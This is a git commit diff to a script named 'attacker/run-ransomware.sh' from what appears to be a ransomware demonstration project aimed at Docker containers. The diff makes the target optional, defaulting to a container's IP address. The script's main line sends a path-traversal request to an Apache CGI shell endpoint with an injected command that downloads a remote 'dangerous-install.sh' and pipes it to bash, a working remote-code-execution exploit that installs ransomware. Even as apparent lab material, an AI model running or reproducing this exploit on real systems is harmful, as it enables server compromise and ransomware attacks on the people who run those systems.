c503bab6f42d41f79dd165392d6c184ad84c957b
soonann <sudo@soonann.dev>
2024-03-18 13:14:32 +0800

    WIP: new dangerous installs with apache user on docker

--- attacker/run-ransomware.sh
+++ attacker/run-ransomware.sh
@@ -1,11 +1,9 @@
 #!/usr/bin/env bash
 if [[ -z $1 ]]; then
-  echo "usage: ./run-ransomware <target>"
-  exit 1;
+  TARGET=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ubuntu-01)
+else
+  TARGET=$1
 fi;
-
-# first arg is the target
-TARGET=$1
 
 # curl target with whoami command
 curl -X POST --data 'echo;wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/scripts/dangerous-install.sh | bash' $TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh 
